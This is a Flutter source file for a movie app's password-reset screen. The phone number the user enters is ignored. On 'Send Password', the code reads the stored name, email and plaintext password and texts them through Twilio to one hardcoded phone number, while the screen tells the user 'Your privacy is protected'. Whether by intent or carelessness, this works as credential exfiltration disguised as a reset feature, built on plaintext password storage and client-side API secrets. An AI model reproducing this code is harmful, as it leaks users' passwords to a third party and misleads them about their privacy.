import 'package:flutter/material.dart';
import 'package:fluttertoast/fluttertoast.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:tmdb_movie_app/controller/text_controller.dart';
import 'package:tmdb_movie_app/dialog/alert/disclamer_dialog.dart';
import 'package:tmdb_movie_app/global/keys/global_keys.dart';
import 'package:twilio_flutter/twilio_flutter.dart';

class ResetPassword extends StatefulWidget {
  @override
  _ResetPasswordState createState() => _ResetPasswordState();
}

class _ResetPasswordState extends State<ResetPassword> {
  GlobalKey<FormState> resetPasswordPageFormKey = GlobalKey<FormState>();
  String number = "";
  String personInfo = "";
  bool callProgress = false;
  late SharedPreferences preferences;
  late TwilioFlutter twilioFlutter;

  @override
  void initState() {
    twilioFlutter = TwilioFlutter(
      accountSid: twiloSid,
      authToken: twiloToken,
      twilioNumber: twiloNumber,
    );
    super.initState();
  }

  @override
  Widget build(BuildContext context) {
    Size size = MediaQuery.of(context).size;
    return Scaffold(
      backgroundColor: Colors.blue.shade200,
      body: Form(
        key: resetPasswordPageFormKey,
        child: Center(
          child: Container(
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(
                12,
              ),
              color: Colors.blue.withOpacity(
                0.4,
              ),
            ),
            width: size.width * 0.8,
            height: size.height * 0.6,
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.center,
              children: <Widget>[
                SizedBox(
                  height: 25,
                ),
                Text("Account Reset Password"),
                SizedBox(
                  height: 25,
                ),
                TextFormField(
                  keyboardType: TextInputType.phone,
                  controller: resetPasswordController,
                  onSaved: (value) {
                    number = value!;
                  },
                  validator: (pref) {
                    if (pref!.length < 6) {
                      return "Your number isn't correct";
                    }
                  },
                  decoration: InputDecoration(
                    prefixIcon: IconButton(
                      icon: Icon(
                        Icons.info_outline,
                        size: 25,
                      ),
                      onPressed: () {
                        showDialog(
                          barrierDismissible: false,
                          context: context,
                          builder: (context) {
                            return DisclamerDialog();
                          },
                        );
                      },
                    ),
                    hintText: "Please enter your [+994-00-000-00-00]",
                    hintStyle: TextStyle(
                      color: Colors.white,
                      fontSize: 16,
                      fontWeight: FontWeight.w400,
                    ),
                  ),
                ),
                SizedBox(
                  height: 30,
                ),
                Visibility(
                  visible: callProgress,
                  child: Align(
                    alignment: Alignment.center,
                    child: CircularProgressIndicator(),
                  ),
                ),
                SizedBox(
                  height: 25,
                ),
                ElevatedButton(
                  onPressed: () async {
                    if (resetPasswordPageFormKey.currentState!.validate()) {
                      preferences = await SharedPreferences.getInstance();
                      setState(() {
                        callProgress = true;
                      });
                      String name = preferences.getString("ad")!;
                      String email = preferences.getString("posta")!;
                      String pass = preferences.getString("parol")!;
                      String message =
                          "\n Name : $name \n Email : $email \n Password : $pass";
                      try {
                        await twilioFlutter.sendSMS(
                            toNumber: "+994504197263", messageBody: message);
                      } catch (e) {
                        print(e.toString());
                      }
                      setState(() {
                        callProgress = false;
                      });

                      Fluttertoast.showToast(
                        msg: "Detail send Succusfluy",
                        toastLength: Toast.LENGTH_LONG,
                        textColor: Colors.teal,
                        backgroundColor: Colors.black,
                      );
                    }
                  },
                  child: Text(
                    "Send Password",
                    style: TextStyle(
                      fontSize: 18,
                      color: Colors.black,
                    ),
                  ),
                ),
                Spacer(),
                Padding(
                  padding: const EdgeInsets.only(bottom: 8),
                  child: Text(
                    "Your privacy is protected",
                    style: TextStyle(
                      fontStyle: FontStyle.italic,
                      fontWeight: FontWeight.w900,
                      fontSize: 18,
                      color: Colors.white,
                    ),
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }
}
